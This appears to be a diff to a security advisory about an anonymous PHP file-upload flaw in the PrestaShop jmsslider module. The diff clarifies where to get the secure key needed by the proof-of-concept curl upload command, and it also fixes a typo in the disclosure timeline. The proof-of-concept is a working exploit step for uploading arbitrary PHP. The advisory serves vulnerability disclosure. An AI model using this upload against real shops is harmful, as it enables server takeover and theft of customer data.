@@ -51,7 +51,7 @@ ajax_jmsslider.php can be called anonymously to upload a php file that can be us
 ## Proof of concept
 
 ```bash
-curl -v -F "data_image=@test.php" "https://preprod.XXX/modules/jmsslider/ajax_jmsslider.php?secure_key=XXXXX&action=addLayer&data_type=image&id_slide=99999"
+curl -v -F "data_image=@test.php" "https://preprod.XXX/modules/jmsslider/ajax_jmsslider.php?secure_key=VALUE_AVAILABLE_ON_FRONTOFFICE&action=addLayer&data_type=image&id_slide=99999"
 ```
 
 ## Patch
@@ -63,7 +63,7 @@ https://www.joommasters.com/index.php/blog/tutorials-and-case-studies/how-to-fix
 | Date | Action |
 |--|--|
 | 2019-09-04 | Vulnerability publish by the editor |
-| 2023-02-17 | Contact the autor |
+| 2023-02-17 | Contact the author |
 | 2023-03-01 | Publish this security advisory |
 
 ## Other recommandations
